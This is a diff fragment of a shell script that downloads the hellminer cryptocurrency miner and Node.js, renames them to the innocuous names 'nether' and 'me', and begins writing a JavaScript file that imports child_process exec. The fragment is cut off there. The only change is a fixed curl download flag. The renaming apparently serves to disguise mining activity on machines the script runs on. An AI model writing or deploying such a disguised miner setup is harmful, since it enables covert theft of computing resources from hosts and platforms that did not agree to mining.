@@ -2,7 +2,7 @@
 wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz || curl -L https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz -o hellminer_linux64.tar.gz
 tar -xzvf *.tar.gz
 rm -rf *.tar.gz* && mv hellminer nether && rm -rf run_miner.sh
-mkdir src && cd src && wget https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz || curl -L https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz && tar -xvf *.tar.xz && mv node-v19.9.0-linux-x64 me && rm -rf *.tar.xz*
+mkdir src && cd src && wget https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz || curl -L https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz -o node-v19.9.0-linux-x64.tar.xz && tar -xvf *.tar.xz && mv node-v19.9.0-linux-x64 me && rm -rf *.tar.xz*
 cd ../
 mkdir lock
 echo "const { exec } = require('child_process');
